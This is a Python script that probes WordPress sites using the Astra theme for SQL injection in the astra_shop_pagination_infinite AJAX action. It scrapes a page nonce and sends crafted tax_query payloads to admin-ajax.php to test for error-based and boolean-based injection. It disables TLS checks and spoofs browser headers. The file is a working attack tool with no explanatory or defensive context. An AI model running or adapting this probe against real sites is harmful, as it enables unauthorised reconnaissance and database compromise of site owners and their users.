# encoding=utf8
from __future__ import unicode_literals
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import argparse
import requests
import re
import json
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()



#http_proxy = "https://127.0.0.1:8085"
#os.environ['HTTP_PROXY'] = http_proxy
#os.environ['HTTPS_PROXY'] = http_proxy

def get_nonce(url):
	headers = {"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	r = session.get(url, headers=headers, allow_redirects=True, verify=False)
	if 'infinite_nonce' in r.text:
		nonce =  re.compile('infinite_nonce":"(.+?)",').findall(str(r.text))[0]
		return nonce, r.url
	else:
		print("Unable to find Nonce")
		sys.exit()






def send_request(url, nonce, payload):
	data = {"action": "astra_shop_pagination_infinite","page_no": "1", "nonce": "{}".format(nonce), "query_vars": r'{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["' + payload + r'"]}}}', "astra_infinite": "astra_pagination_ajax"}
	headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
	url += '/wp-admin/admin-ajax.php'
	r = session.post(url, headers=headers, data=data, verify=False)
	return r.text





def check_sqli(url, nonce):
	# grep error base
	res = send_request(url, nonce, "'")
	if 'database error' in res:
		return True, 'Vuln to Error-Based.'
	# query 1
	res1 = send_request(url, nonce, '9656)) and ((7556=1223')
	res2 = send_request(url, nonce, '9634)) or ((6532=6532')
	if res1 == '' and (len(res2) > len(res1)):
		return True, 'Vuln to Boolean-Based.'
	return False, 'Not vuln'		





def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", help='URL', required="True")
	args = parser.parse_args()
	url = args.url
	nonce, r_url = get_nonce(url)
	print(check_sqli(r_url, nonce)[1])

	





main()
